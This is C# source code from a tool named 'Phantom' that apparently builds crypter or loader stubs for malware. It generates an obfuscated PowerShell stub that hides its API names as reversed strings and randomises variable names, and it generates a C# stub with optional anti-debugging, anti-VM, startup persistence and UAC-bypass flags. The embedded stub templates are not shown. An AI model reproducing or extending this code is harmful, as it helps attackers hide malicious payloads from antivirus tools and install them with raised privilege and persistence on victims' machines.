using System;
using System.Collections.Generic;
using System.Text;

using static Phantom.Utils;

namespace Phantom
{
    internal class StubGen
    {
        // Method to create PowerShell script
        internal static string CreatePS(byte[] key, byte[] iv, EncryptionMode mode, Random rng)
        {
            // Declare variables
            string stubcode = string.Empty;
            string base64DecodeString = @"('gnirtS46esaBmorF'[-1..-16] -join '')";
            string readAllTextString = @"('txeTllAdaeR'[-1..-11] -join '')";
            string loadString = @"('daoL'[-1..-4] -join '')";
            string decryptionKey = Convert.ToBase64String(key);
            string decryptionIV = Convert.ToBase64String(iv);
            string batPathVar = RandomString(5, rng);
            string contentsVar = RandomString(5, rng);
            string lastLineVar = RandomString(5, rng);
            string lineVar = RandomString(5, rng);
            string payloadVar = RandomString(5, rng);
            string msiVar = RandomString(5, rng);
            string msoVar = RandomString(5, rng);
            string gsVar = RandomString(5, rng);
            string obfStep1Var = RandomString(5, rng);
            string obfStep2Var = RandomString(5, rng);

            // Get embedded PowerShell script
            stubcode += GetEmbeddedString(@"Phantom.Resources.AESStub.ps1");

            // Replace placeholders with generated values
            stubcode = stubcode.Replace(@"FromBase64String", base64DecodeString)
                               .Replace(@"ReadAllText", readAllTextString)
                               .Replace(@"Load", loadString)
                               .Replace(@"DECRYPTION_KEY", decryptionKey)
                               .Replace(@"DECRYPTION_IV", decryptionIV)
                               .Replace(@"batPath_var", batPathVar)
                               .Replace(@"contents_var", contentsVar)
                               .Replace(@"lastline_var", lastLineVar)
                               .Replace(@"line_var", lineVar)
                               .Replace(@"payload_var", payloadVar)
                               .Replace(@"msi_var", msiVar)
                               .Replace(@"mso_var", msoVar)
                               .Replace(@"gs_var", gsVar)
                               .Replace(@"obfstep1_var", obfStep1Var)
                               .Replace(@"obfstep2_var", obfStep2Var)
                               .Replace(Environment.NewLine, string.Empty);

            // Return the generated PowerShell script
            return stubcode;
        }

        // Method to create C# stub code
        internal static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool startup, bool uacbypass, bool native, Random rng)
        {
            // Declare variables
            string namespacename = RandomString(20, rng);
            string classname = RandomString(20, rng);
            string aesfunction = RandomString(20, rng);
            string uncompressfunction = RandomString(20, rng);
            string gerfunction = RandomString(20, rng);

            // Encrypt predefined strings
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            string stub = string.Empty;
            string stubcode = GetEmbeddedString(@"Phantom.Resources.Stub.cs");

            // Add compiler flags if specified
            if (antidebug)
            {
                stub += "#define ANTI_DEBUG\n";
            }
            if (antivm)
            {
                stub += "#define ANTI_VM\n";
            }
            if (startup)
            {
                stub += "#define STARTUP\n";
            }
            if (uacbypass)
            {
                stub += "#define UAC_BYPASS\n";
            }
            if (native)
            {
                stub += "#define NATIVE\n";
            }

            // Replace placeholders with generated values
            stubcode = stubcode.Replace(@"namespace_name", namespacename)
                               .Replace(@"class_name", classname)
                               .Replace(@"aesfunction_name", aesfunction)
                               .Replace(@"uncompressfunction_name", uncompressfunction)
                               .Replace(@"getembeddedresourcefunction_name", gerfunction)
                               .Replace(@"key_str", key_str)
                               .Replace(@"iv_str", iv_str);

            // Concatenate stub code with additional compiler flags if specified
            stub += stubcode;

            // Return the generated C# stub code
            return stub;
        }
    }
}